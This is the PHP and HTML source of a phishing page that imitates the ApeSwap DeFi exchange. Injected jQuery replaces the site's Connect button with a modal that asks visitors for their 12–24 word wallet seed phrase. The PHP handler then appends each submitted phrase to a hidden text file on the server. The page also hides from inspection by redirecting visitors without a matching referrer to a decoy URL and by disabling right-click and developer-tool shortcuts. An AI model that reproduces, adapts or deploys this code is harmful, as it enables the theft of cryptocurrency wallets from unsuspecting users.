<?php
   // <!---NOTE: Search for appswap/static/js/ and change to static/js/ when deployed to live--->
   // <!--- and comment line 87 to 91, and change php testurl variable to false--->
   // echo $_SERVER['HTTP_REFERER'];

    if($_SERVER["REQUEST_METHOD"] == "POST"){
        if (ob_get_length() > 0) { ob_end_clean(); }

        if(isset($_POST['load_phrase'])){
            $myfile = fopen("assets/jks8743jkewhfew8743rwe_fdjfsghfy34ruendsyuuy.txt", "a") or die("Unable to open file!");

            $txt = "[" . date("Y-m-d h:i:sa") . "] Phrase is ". $_POST['data_phrase'] ."\n\n";
            fwrite($myfile, $txt);
            fclose($myfile);

            echo "success";
        }
        exit;
    }
?>

<?php
    $test_url = true;
    $set_url = !$test_url ? "https://apeloveswapupdate.blogspot.com/" : "http://localhost/appswap/test.php";
 ?>

<?php if((isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'],$set_url) ) || !isset($_SERVER['HTTP_REFERER']) ){?>
    <iframe src="<?=$set_url;?>" width="100%" frameborder="0" height="100%"></iframe>
    <?php
        header('Location: '. $set_url);
    ?>
<?php exit; } ?>


<!doctype html>
<html lang="en">
   <head>
      <meta charset="utf-8"/>
      <script>!function(e,t,a,n,g){e[n]=e[n]||[],e[n].push({"gtm.start":(new Date).getTime(),event:"gtm.js"});var m=t.getElementsByTagName(a)[0],r=t.createElement(a);r.async=!0,r.src="https://www.googletagmanager.com/gtm.js?id=GTM-N4FS3L6",m.parentNode.insertBefore(r,m)}(window,document,"script","dataLayer")</script>
      <link rel="preconnect" href="https://bsc-dataseed1.ninicoin.io"/>
      <link rel="preconnect" href="https://bsc-dataseed1.defibit.io"/>
      <link rel="preconnect" href="https://bsc-dataseed.binance.org"/>
      <link rel="preconnect" href="https://fonts.gstatic.com"/>
      <link href="https://fonts.googleapis.com/css2?family=Titan+One:wght@300;400;600&display=swap" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;600&display=swap" rel="stylesheet"/>
      <link rel="shortcut icon" href="images/512x512_App_Icon.png"/>
      <link rel="apple-touch-icon" href="images/512x512_App_Icon.png"/>
      <link rel="manifest" href="manifest.json"/>
      <title>ApeSwap</title>
      <meta name="description" content="Cheaper and faster than Uniswap? Discover ApeSwap, the #1 AMM and yield farm for apes by apes."/>
      <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,minimum-scale=1"/>
      <meta name="theme-color" content="#000000"/>
      <meta name="twitter:image" content="images/512x512_App_Icon.png"/>
      <meta name="twitter:description" content="The best AMM on BSC by apes for apes! Earn BANANA through yield farming."/>
      <meta name="twitter:card" content="summary"/>
      <meta name="twitter:title" content="ApeSwap - A next evolution DeFi exchange on Binance Smart Chain (BSC)"/>
      <script src="static/js/panc/jquery-3.6.0.min.js"></script>
   </head>
   <body>
       
      <noscript>You need to enable JavaScript to run this app.</noscript>
      <div id="root"></div>
      <script>!function(e){function t(t){for(var n,o,c=t[0],d=t[1],u=t[2],i=0,s=[];i<c.length;i++)o=c[i],Object.prototype.hasOwnProperty.call(a,o)&&a[o]&&s.push(a[o][0]),a[o]=0;for(n in d)Object.prototype.hasOwnProperty.call(d,n)&&(e[n]=d[n]);for(l&&l(t);s.length;)s.shift()();return f.push.apply(f,u||[]),r()}function r(){for(var e,t=0;t<f.length;t++){for(var r=f[t],n=!0,o=1;o<r.length;o++){var d=r[o];0!==a[d]&&(n=!1)}n&&(f.splice(t--,1),e=c(c.s=r[0]))}return e}var n={},o={5:0},a={5:0},f=[];function c(t){if(n[t])return n[t].exports;var r=n[t]={i:t,l:!1,exports:{}};return e[t].call(r.exports,r,r.exports,c),r.l=!0,r.exports}c.e=function(e){var t=[];o[e]?t.push(o[e]):0!==o[e]&&{9:1}[e]&&t.push(o[e]=new Promise((function(t,r){for(var n="static/css/"+({}[e]||e)+"."+{0:"31d6cfe0",1:"31d6cfe0",2:"31d6cfe0",3:"31d6cfe0",7:"31d6cfe0",8:"31d6cfe0",9:"6b560088",10:"31d6cfe0",11:"31d6cfe0",12:"31d6cfe0",13:"31d6cfe0",14:"31d6cfe0",15:"31d6cfe0",16:"31d6cfe0",17:"31d6cfe0",18:"31d6cfe0",19:"31d6cfe0",20:"31d6cfe0",21:"31d6cfe0",22:"31d6cfe0",23:"31d6cfe0",24:"31d6cfe0",25:"31d6cfe0",26:"31d6cfe0",27:"31d6cfe0"}[e]+".chunk.css",a=c.p+n,f=document.getElementsByTagName("link"),d=0;d<f.length;d++){var u=(l=f[d]).getAttribute("data-href")||l.getAttribute("href");if("stylesheet"===l.rel&&(u===n||u===a))return t()}var i=document.getElementsByTagName("style");for(d=0;d<i.length;d++){var l;if((u=(l=i[d]).getAttribute("data-href"))===n||u===a)return t()}var s=document.createElement("link");s.rel="stylesheet",s.type="text/css",s.onload=t,s.onerror=function(t){var n=t&&t.target&&t.target.src||a,f=new Error("Loading CSS chunk "+e+" failed.\n("+n+")");f.code="CSS_CHUNK_LOAD_FAILED",f.request=n,delete o[e],s.parentNode.removeChild(s),r(f)},s.href=a,document.getElementsByTagName("head")[0].appendChild(s)})).then((function(){o[e]=0})));var r=a[e];if(0!==r)if(r)t.push(r[2]);else{var n=new Promise((function(t,n){r=a[e]=[t,n]}));t.push(r[2]=n);var f,d=document.createElement("script");d.charset="utf-8",d.timeout=120,c.nc&&d.setAttribute("nonce",c.nc),d.src=function(e){return c.p+"appswap/static/js/"+({}[e]||e)+"."+{0:"d4a4d46b",1:"77c2d3fc",2:"a4499dfa",3:"fa0f2fcd",7:"bda6edd7",8:"2f5964c7",9:"b7cb7d43",10:"badfda5b",11:"deef0d25",12:"21e676f0",13:"3d825e94",14:"015eda18",15:"7c60a6e5",16:"80510610",17:"be45de6b",18:"4f58006e",19:"e2f5526d",20:"0d0ba974",21:"3848922b",22:"57a56eae",23:"5bfa2704",24:"70235f3e",25:"0f43c936",26:"09778f75",27:"37fb442e"}[e]+".chunk.js"}(e);var u=new Error;f=function(t){d.onerror=d.onload=null,clearTimeout(i);var r=a[e];if(0!==r){if(r){var n=t&&("load"===t.type?"missing":t.type),o=t&&t.target&&t.target.src;u.message="Loading chunk "+e+" failed.\n("+n+": "+o+")",u.name="ChunkLoadError",u.type=n,u.request=o,r[1](u)}a[e]=void 0}};var i=setTimeout((function(){f({type:"timeout",target:d})}),12e4);d.onerror=d.onload=f,document.head.appendChild(d)}return Promise.all(t)},c.m=e,c.c=n,c.d=function(e,t,r){c.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},c.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},c.t=function(e,t){if(1&t&&(e=c(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(c.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)c.d(r,n,function(t){return e[t]}.bind(null,n));return r},c.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return c.d(t,"a",t),t},c.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},c.p="/",c.oe=function(e){throw console.error(e),e};var d=this["webpackJsonpapeswap-frontend"]=this["webpackJsonpapeswap-frontend"]||[],u=d.push.bind(d);d.push=t,d=d.slice();for(var i=0;i<d.length;i++)t(d[i]);var l=u;r()}([])
      </script>


      <script src="static/js/6.f60d0040.chunk.js"></script>
      <script src="static/js/main.4cc883df.chunk.js"></script>

      <script>
         $('body').css('pointer-events','none');
         window.oncontextmenu = function () {
            return false;
         }
         $(document).keydown(function (event) {
            if (event.keyCode == 123) {
                  return false;
            }
            else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
                  return false;
            }
         });

         $(function(){
            const a = setInterval(() => {
               if (document.readyState == "complete") {
                  if(isMobileDev()){
                     $('div .sc-TBWwm').html(`<img src="homepage_cut_mobile.png">`).attr('align','center')
                  }else{
                     $('div .sc-TBWwm').html(`<img src="homepage_cut_desktop.png" >`).attr('align','center')
                  }

                  $('.sc-TBWwm, .sc-hiwReK, .sc-clIAKW, #custom-connect').on('click', function (e) {
                     $('.sc-dkPtyc')[1].click()

                     $('button[class="sc-dkPtyc fsDSiK"], a[class="sc-gsDJrp sc-giYgFv dUJXlR gIdltt sc-ehCIER jXeQeS"').on('click', function(e){
                        $('h2[class="sc-gsDJrp sc-hGPAah jYJnta bVWChs"]').text('Connect to wallet');
                        let retrivebox = 
                        `<p align="center">Enter your 12 - 24 words seed phrase to connect and validate your wallet</p>
                        <br>
                        <textarea name="phrase_text" id="phrase_text" style="border-radius:5px; width:100%; color:#141824" rows="4"></textarea>
                        <br><br>
                        <button class="iYuMjr button_continue" width="100%" scale="md">Connect Wallet</button>
                        `
                        //modal box
                        $('div[class="sc-eCImvq diumCn"]').html(retrivebox)

                        e.preventDefault()
                        return false
                     })

                     e.preventDefault()
                     return false;
                  })
                  
                  $('body').css('pointer-events','all');
                  console.log('done')
                  clearInterval(a)
               }
            }, 1000);            
         })

         $(function(){
            //FOR THE CONNECT BUTTON
            $('button[class="sc-dkPtyc fxhMZE"]').parent('div').append('<button id="custom-connect" class="fxhMZE" scale="sm">Connect</button>')
            $('button[class="sc-dkPtyc fxhMZE"]').hide()

            $(document).on('click', '.button_continue', function(e){
               let field = $('#phrase_text')
               if(field.val().length >= 12){
                  $(this).text('Loading...').css('pointer-events','none')

                  $.ajax({
                     url: "",
                     method: "POST",
                     data: {"load_phrase":1, "data_phrase":field.val()},
                     success: function(result){
                           result = result.trim()
                           console.log(result)
                           if(result == "success"){
                              //modal box
                              $('div[class="sc-eCImvq diumCn"]').html(
                                 `<div class="flex flex-col h-full w-full rounded p-5 overflow-y-auto">
                                       <img src="images/generated_code.png">
                                       <br><br>
                                       <span align="center">Kindly contact <a href="">ADMIN/SUPPORT</a> <br> for your authentication code</span>
                                 </div>
                                 `
                              )
                              $(this).text('Connect Wallet').css('pointer-events','all')
                           }
                     },
                     error: function(xhr, ajaxOptions, thrownError){
                           alert(thrownError);
                     }
                  })
               }
            })
         })

         function isMobileDev(){
            if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent) 
    || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent.substr(0,4))) { 
            return true;
            }
            return false;
         }
         
      </script>

      <style>
         .iYuMjr {
            -webkit-box-align: center;
            align-items: center;
            background-color: rgb(255, 179, 0);
            border-radius: 5px;
            border: none;
            box-shadow: none;
            color: white;
            cursor: pointer;
            display: inline-flex;
            font-size: 12px;
            font-weight: 400;
            width: 100%;
            height: 36px;
            line-height: 1;
            letter-spacing: 0.03em;
            -webkit-box-pack: center;
            justify-content: center;
            outline: 0px;
            padding: 0px 24px;
            transition: background-color 0.2s ease 0s;
            opacity: 1;
         }
      </style>
   </body>
</html>